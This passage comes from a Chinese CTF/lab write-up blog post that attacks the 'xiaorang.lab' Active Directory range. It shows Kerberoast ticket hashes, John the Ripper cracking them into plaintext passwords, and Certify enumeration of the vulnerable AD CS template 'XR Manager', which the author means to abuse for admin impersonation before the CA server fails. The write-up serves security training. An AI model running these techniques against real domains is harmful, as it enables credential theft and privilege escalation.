+TERMSERV/desktop-cbktvmo.xiaorang.lab  zhangxia            <span class="token number">2023</span>-07-14 <span class="token number">12</span>:45:45.213944  <span class="token operator">&lt;</span>never<span class="token operator">></span>   
+WWW/desktop-cbktvmo.xiaorang.lab/IIS   zhangxia            <span class="token number">2023</span>-07-14 <span class="token number">12</span>:45:45.213944  <span class="token operator">&lt;</span>never<span class="token operator">></span>   
+TERMSERV/win2016.xiaorang.lab          chenchen            <span class="token number">2023</span>-07-14 <span class="token number">12</span>:45:39.767035  <span class="token operator">&lt;</span>never<span class="token operator">></span>   
+
+
+
+<span class="token variable">$krb5tgs</span><span class="token variable">$23</span><span class="token variable">$*</span>zhangxia<span class="token variable">$XIAORANG</span>.LAB<span class="token variable">$WWW</span>/desktop-cbktvmo.xiaorang.lab/IIS*<span class="token variable">$ecded3cd07ccc3c31c0d698da33cb8b9</span><span class="token variable">$74e137e024517f28b99cab3c4cce3a1ca08926b6aa091030200baf9a9682217b06e50e62e16df39b577e8c7e81cebc2b48dc86d6eae2bfe77d3b9ce09ab318a1e49846e34a25ded83d6640680d64ba3029cc1c1783af09e2f92e9a8a84260255c1360a707de9cf87c0cde8eb3b018e50ba6707ab9f60a27b1817fe2919fdd04d1e2c4b03395893002b7c205001c0d9f9f404dfff62ce54d9d21e97b9e689a11bfa2b6d62227a2a0014945aacfa81ae3e9ceb42d2f47d75c0af55f3877cc41174bfa7a4843a8ccc6628dd7f56cc71862403ff412c60d05d39e19890dbb08eb077e2e6deb93a669716807d5f7cacc99ce25a7bda91405b27f93ab2180646d0cb615121876d93230737cae42c92067e3de1b7f0ba9dffe024be56398454929c4144eb58c2b5c7a7c914b22b754d7037dbe56c1bb7b4d8ba004646ba3a334cb39064cdc702cd1c099844363868e59b0492fce48dff184fc32efc51f64f81248d8a8ba38dc9c9d9df3c9a6e524da0e8dd1d87dbc6ccf50b6fa27c6c5fd7f58e7148a4820ebe3367431c504abf74337587f0189b5ba58096435238b1dd240a9433e6843d10ad36f05a9bfc9558b38209fa18b50ef7e532226940c23c8a82d2b2440c24704611d9ad63471f0c867d6f65f9c5ae87b7de5c6cbddda52ba30c304780da12080cde834709430c3e6b8c946ff4f5a0efce60eb592effa55e857049292add75185b358ca4da6c29fbccb0ba5b7366e5f72a9897d7433649329c8338cf7f74c8c859c73992840e097a92bf3c94fbba31a55d490e35d4fbcc4e297c9bdded6f711bc980b47c309ec3a6f072c7e19c10a59bae3168a3ac0aad1703169f4512abc1b007787d3b90bcec511dfcf3ee74df4c85a7cb306f20ffd1c13582bc4a448cbca888cb8982c9ce618092efd1b8565e63e5168807013efa11fc796b627d8d894d6fa378834327fd115728ddb04fbccfc59c76765722b1e1b60e092a906b64e3dd9ed6b80aada51a0349df9e402564b2e90d8fe111535d35b3bde819f55b8eda5982570537bd01abaa749c8b5f3f2967fe4b83b0b4f46c203628159e7815e544250f3713cc32e4e39a4765692d10d44fe51b4905166b1026efb2a440cd09f784426b73d4c18e7a41cfe9ca36fba8ce63bba8931b326167a2f4d788fd4fb4c0c708d573e1a0b357694dd991f08b6b57be119704e95bc9b3006e88bea29264763f48ef29b3a1dec1d81ad108f582eadbd3254496e962c1d00e0f672eaa4098b155f12284d1a6053e493f4eba34e4b37d9aaca350399d6f023b96597bdbefdd97babf8ddfcd491ccdd1bf1a1f3ff0154d666fe16565a6fd43ad5d24a2e102c4e11d4b8f983e48ccc10b6111adc477cea7cc7a93de2c7b71fcf267062b3353567b1f9e6f4765c10da4fb8c5304eada4689e4393eaa5ba7edb813259bbb54c00363a0526c9a6f2eac76639f0447666ba6a9aae265bfef67ded98b64367e1bfa6c80d993317e75ea99d3a646a31847fb4250</span>
+<span class="token variable">$krb5tgs</span><span class="token variable">$23</span><span class="token variable">$*</span>chenchen<span class="token variable">$XIAORANG</span>.LAB<span class="token variable">$TERMSERV</span>/win2016.xiaorang.lab*<span class="token variable">$a76b2e39a45b6e4f99dc7f47d64f9c6b</span><span class="token variable">$21bf4bd4b95faf39c29d4839d748341a9999a9f3f78f59a65df4a8f628fd107530b33eb10bd12efa2e424f03eafe298b1b6f258e7e0a444e671c444c814015880d38a5d4fab6cdd5c0a1b367ca5d6f5b15eea507110a8c0d86a1d34aaf1f6d778de95eea3ff9b0f728d43c5389732228da0c8bbe106c0b0bc314e7bd527d2f070f1955af7cb3e4a95f76dd7d176a7db6787cdfd37ec9bfc2bde03ee2c3d91da42c673dbfba495146843b13fc6fa4ed85447e1a653047dd5da5b9897552a89439c8aeceda3d444c208d5c35dd8002b113966f38b20bbc15c624322350b110abe489f0525f82a9681053d8cd9289ff0ded94caf48312301771b86ca2cb665594e4879021d2859d7f6f0fb4e135d9f340a69c294c1390beecaa75ceb9025bc9b4d5df2ea8b78406449875aa4c5e73984875c70d95cfcbe5cf60f95243116a368cd0f0446f06c652065cf0644e401ed2c9d4e430c29c9af02c49aaa29d31b1ed72dc4a8ab8fa6867a82ff6bca8eb441977e8d22f2488988d8a0be47db9f3fdd2a198516975da488b367b48147530cb7e6861b07bf23b29b65f6fe474e5cceaab9971e1953fa21ea00dd07494897f8ee39cd22548853b42deaae5d4ccddaa8ff2c2053bf33785122d83ec0267de8dc9fbd6f9f07c5cb76f27a4fa2bbb68e12b907413eb2ee518c3f526d035d089304ff8f32c69b872e8742e2c3d248ce4432b319614588c65abf0601c8a79cfd418c221a8028dee84b695620a7f463ba6bd935e7fdbfe8e2380de4132af43f84c08410d17bee61cfbdc8705ab035af115fd75193c492fc59d6eb0e0d1f4ef0d02dd25cb032f9e22d967d2787951f5add0eddb99384a51c133f5f5ac494fa77f351cb9e203630adf6ccc981e12f33388c39083a44fe84a92bca9090d101419e18d8135c80d899438b8c088f411cf6590c294c6332ee59ad7d8838e28a44b3897d61560ee4ea8d1e6b95d26af7efbf95ca1c72fcbd3de197986b8094e75a117178cfa36325c101cb892190105e6e58ec49e09589014259449f56dadf12409849b51ac03c9faf3cf468703805859a743e19fa483fffa4647defb01d980f01dc9cd2adf8c1cd44edf130eda738df7d36da0a5ef729d58308f1bfbec5b1215ea16ce3ac4f50699dc3207fed4a566b2243db32d542f04a215de04bf04b16c51d9adc9db94fbc36e3d46e9a7d702425d04704a4d8f1c5bd10fe814aef088889a72f4c2fd761f68062baba0f04c7ddbb404b9a7df715fcd8e3045e3a9730f2e4a2dca46e51bcaf8669ec42180dcecc8939112f55c43b4b35a44e9b99e5f4743f58a23615fd6941625c873a4b847db0ab61ccce7def6a334f7e50a4a4998a903e699aa275923b4d670014f0a14287d04482444f920234eaf0b50847421f0f3f9e489f76bfa4d35486d0e503b754140460cc9321a70333fb7de75e47ce0e069f75037b97c8df47fbbda2346b2626406bc1901c1bae83a8a96fad58a74d7484c30f9b6e18bbd7a0940</span></code></pre>
+<p>拿到两个用户哈希</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  john aaa <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/rockyou.txt                                                   <span class="token punctuation">[</span><span class="token number">20</span>:01:04<span class="token punctuation">]</span>
+Using default input encoding: UTF-8
+Loaded <span class="token number">2</span> password hashes with <span class="token number">2</span> different salts <span class="token punctuation">(</span>krb5tgs, Kerberos <span class="token number">5</span> TGS etype <span class="token number">23</span> <span class="token punctuation">[</span>MD4 HMAC-MD5 RC4<span class="token punctuation">]</span><span class="token punctuation">)</span>
+Warning: invalid UTF-8 seen reading ~/.john/john.pot
+Press <span class="token string">'q'</span> or Ctrl-C to abort, almost any other key <span class="token keyword">for</span> status
+MyPass2@@6       <span class="token punctuation">(</span>?<span class="token punctuation">)</span>     
+@Passw0rd@       <span class="token punctuation">(</span>?<span class="token punctuation">)</span>     
+2g <span class="token number">0</span>:00:00:26 DONE <span class="token punctuation">(</span><span class="token number">2025</span>-02-09 <span class="token number">20</span>:01<span class="token punctuation">)</span> <span class="token number">0</span>.07665g/s 440314p/s 854663c/s 854663C/s @S95008<span class="token punctuation">..</span>@PPL3B0TT0M
+Use the <span class="token string">"--show"</span> option to display all of the cracked passwords reliably
+Session completed. </code></pre>
+<p>可以跑出来 <code>xiaorang.lab\zhangxia:MyPass2@@6</code> <code>xiaorang.lab\chenchen:@Passw0rd@</code><br>chenchen用户可以rdp登录<br>题目标注AD CS，所以用Certify查找易受攻击的证书板块<br><a target="_blank" rel="noopener" href="https://github.com/GhostPack/Certify">https://github.com/GhostPack/Certify</a></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">c:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>chenchen<span class="token punctuation">\</span>Desktop<span class="token operator">></span>Certify.exe <span class="token function">find</span> /vulnerable
+
+   _____          _   _  __
+  / ____<span class="token operator">|</span>        <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token punctuation">)</span>/ _<span class="token operator">|</span>
+ <span class="token operator">|</span> <span class="token operator">|</span>     ___ _ __<span class="token operator">|</span> <span class="token operator">|</span>_ _<span class="token operator">|</span> <span class="token operator">|</span>_ _   _
+ <span class="token operator">|</span> <span class="token operator">|</span>    / _ <span class="token punctuation">\</span> <span class="token string">'__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.1.0
+
+[*] Action: Find certificate templates
+[*] Using the search base '</span>CN<span class="token operator">=</span>Configuration,DC<span class="token operator">=</span>xiaorang,DC<span class="token operator">=</span>lab<span class="token string">'
+
+[*] Listing info about the Enterprise CA '</span>xiaorang-XIAORANG-DC-CA'
+
+    Enterprise CA Name            <span class="token builtin class-name">:</span> xiaorang-XIAORANG-DC-CA
+    DNS Hostname                  <span class="token builtin class-name">:</span> XIAORANG-DC.xiaorang.lab
+    FullName                      <span class="token builtin class-name">:</span> XIAORANG-DC.xiaorang.lab<span class="token punctuation">\</span>xiaorang-XIAORANG-DC-CA
+    Flags                         <span class="token builtin class-name">:</span> SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
+    Cert SubjectName              <span class="token builtin class-name">:</span> <span class="token assign-left variable">CN</span><span class="token operator">=</span>xiaorang-XIAORANG-DC-CA, <span class="token assign-left variable">DC</span><span class="token operator">=</span>xiaorang, <span class="token assign-left variable">DC</span><span class="token operator">=</span>lab
+    Cert Thumbprint               <span class="token builtin class-name">:</span> 37BFD9FE73CA81E18E7A87CEBD90AF267E57170E
+    Cert Serial                   <span class="token builtin class-name">:</span> 43A73F4A37050EAA4E29C0D95BC84BB5
+    Cert Start Date               <span class="token builtin class-name">:</span> <span class="token number">2023</span>/7/14 <span class="token number">12</span>:33:21
+    Cert End Date                 <span class="token builtin class-name">:</span> <span class="token number">2028</span>/7/14 <span class="token number">12</span>:43:21
+    Cert Chain                    <span class="token builtin class-name">:</span> <span class="token assign-left variable">CN</span><span class="token operator">=</span>xiaorang-XIAORANG-DC-CA,DC<span class="token operator">=</span>xiaorang,DC<span class="token operator">=</span>lab
+    UserSpecifiedSAN              <span class="token builtin class-name">:</span> Disabled
+    CA Permissions                <span class="token builtin class-name">:</span>
+      Owner: BUILTIN<span class="token punctuation">\</span>Administrators        S-1-5-32-544
+
+      Access Rights                                     Principal
+
+      Allow  Enroll                                     NT AUTHORITY<span class="token punctuation">\</span>Authenticated UsersS-1-5-11
+      Allow  ManageCA, ManageCertificates               BUILTIN<span class="token punctuation">\</span>Administrators        S-1-5-32-544
+      Allow  ManageCA, ManageCertificates               XIAORANG<span class="token punctuation">\</span>Domain Admins        S-1-5-21-990187620-235975882-534697781-512
+      Allow  ManageCA, ManageCertificates               XIAORANG<span class="token punctuation">\</span>Enterprise Admins    S-1-5-21-990187620-235975882-534697781-519
+    Enrollment Agent Restrictions <span class="token builtin class-name">:</span> None
+
+<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Vulnerable Certificates Templates <span class="token builtin class-name">:</span>
+
+    CA Name                               <span class="token builtin class-name">:</span> XIAORANG-DC.xiaorang.lab<span class="token punctuation">\</span>xiaorang-XIAORANG-DC-CA
+    Template Name                         <span class="token builtin class-name">:</span> XR Manager
+    Schema Version                        <span class="token builtin class-name">:</span> <span class="token number">2</span>
+    Validity Period                       <span class="token builtin class-name">:</span> <span class="token number">1</span> year
+    Renewal Period                        <span class="token builtin class-name">:</span> <span class="token number">6</span> weeks
+    msPKI-Certificate-Name-Flag          <span class="token builtin class-name">:</span> ENROLLEE_SUPPLIES_SUBJECT
+    mspki-enrollment-flag                 <span class="token builtin class-name">:</span> INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
+    Authorized Signatures Required        <span class="token builtin class-name">:</span> <span class="token number">0</span>
+    pkiextendedkeyusage                   <span class="token builtin class-name">:</span> 安全电子邮件, 加密文件系统, 客户端身份验证
+    mspki-certificate-application-policy  <span class="token builtin class-name">:</span> 安全电子邮件, 加密文件系统, 客户端身份验证
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           <span class="token builtin class-name">:</span> NT AUTHORITY<span class="token punctuation">\</span>Authenticated UsersS-1-5-11
+                                      XIAORANG<span class="token punctuation">\</span>Domain Admins        S-1-5-21-990187620-235975882-534697781-512
+                                      XIAORANG<span class="token punctuation">\</span>Domain Users         S-1-5-21-990187620-235975882-534697781-513
+                                      XIAORANG<span class="token punctuation">\</span>Enterprise Admins    S-1-5-21-990187620-235975882-534697781-519
+      Object Control Permissions
+        Owner                       <span class="token builtin class-name">:</span> XIAORANG<span class="token punctuation">\</span>Administrator        S-1-5-21-990187620-235975882-534697781-500
+        WriteOwner Principals       <span class="token builtin class-name">:</span> XIAORANG<span class="token punctuation">\</span>Administrator        S-1-5-21-990187620-235975882-534697781-500
+                                      XIAORANG<span class="token punctuation">\</span>Domain Admins        S-1-5-21-990187620-235975882-534697781-512
+                                      XIAORANG<span class="token punctuation">\</span>Enterprise Admins    S-1-5-21-990187620-235975882-534697781-519
+        WriteDacl Principals        <span class="token builtin class-name">:</span> XIAORANG<span class="token punctuation">\</span>Administrator        S-1-5-21-990187620-235975882-534697781-500
+                                      XIAORANG<span class="token punctuation">\</span>Domain Admins        S-1-5-21-990187620-235975882-534697781-512
+                                      XIAORANG<span class="token punctuation">\</span>Enterprise Admins    S-1-5-21-990187620-235975882-534697781-519
+        WriteProperty Principals    <span class="token builtin class-name">:</span> XIAORANG<span class="token punctuation">\</span>Administrator        S-1-5-21-990187620-235975882-534697781-500
+                                      XIAORANG<span class="token punctuation">\</span>Domain Admins        S-1-5-21-990187620-235975882-534697781-512
+                                      XIAORANG<span class="token punctuation">\</span>Enterprise Admins    S-1-5-21-990187620-235975882-534697781-519
+
+
+
+Certify completed <span class="token keyword">in</span> 00:00:09.8863071</code></pre>
+<p><code>XR Manager</code>可以被攻击,利用此模板申请证书冒充管理员<br>然后一直报错，才知道CA服务器<code>172.22.9.13</code>没有起来,重启5次都起不来，嘻嘻,下班。</p>
+</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>ta0</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://tao0845.github.io/posts/3a283e32/" title="春秋云境-Certify">https://tao0845.github.io/posts/3a283e32/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/posts/93b35a6e/" rel="prev" title="春秋云境-Delegation"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">春秋云境-Delegation</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/1a843bca/" rel="next" title="Vulnyx-Anon"><span class="post-nav-text">Vulnyx-Anon</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2025 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> ta0</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.1.1</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div id="busuanzi"><span id="busuanzi_container_site_uv" title="总访客量"><span><span class="icon iconify" data-icon="ri:user-line"></span></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><span class="icon iconify" data-icon="ri:eye-line"></span></span><span id="busuanzi_value_site_pv"></span></span><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
+  // Handle and trigger popup window
+  document.querySelector(".popup-trigger").addEventListener("click", () => {
+    document.querySelector(".popup").classList.add("show");
+    setTimeout(() => {
+      document.querySelector(".search-input").focus();
+    }, 100);
+  });
+
+  // Monitor main search box
+  const onPopupClose = () => {
+    document.querySelector(".popup").classList.remove("show");
+  };
+
+  document.querySelector(".popup-btn-close").addEventListener("click", () => {
+    onPopupClose();
+  });
+
+  window.addEventListener("keyup", event => {
+    if (event.key === "Escape") {
+      onPopupClose();
+    }
+  });
+});
+</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div class="search-result-container"></div></div><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
+mediumZoom(images)</script><style>.medium-zoom-image {
+  z-index: 99;
+}</style></body></html>
